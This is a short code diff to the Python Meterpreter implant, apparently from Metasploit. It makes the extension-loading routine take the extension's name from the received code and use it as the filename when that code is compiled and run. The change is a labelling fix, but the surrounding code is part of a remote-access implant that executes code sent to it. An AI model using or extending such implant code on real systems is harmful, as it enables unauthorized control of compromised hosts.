@@ -1417,11 +1417,16 @@ class PythonMeterpreter(object):
         if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
             return ERROR_FAILURE, response
 
+        libname = '???'
+        match = re.search(r'^meterpreter\.register_extension\(\'([a-zA-Z0-9]+)\'\)$', str(data_tlv['value']), re.MULTILINE)
+        if match is not None:
+            libname = match.group(1)
+
         self.last_registered_extension = None
         symbols_for_extensions = {'meterpreter':self}
         symbols_for_extensions.update(EXPORTED_SYMBOLS)
         i = code.InteractiveInterpreter(symbols_for_extensions)
-        i.runcode(compile(data_tlv['value'], '', 'exec'))
+        i.runcode(compile(data_tlv['value'], 'ext_server_' + libname + '.py', 'exec'))
         extension_name = self.last_registered_extension
 
         if extension_name:
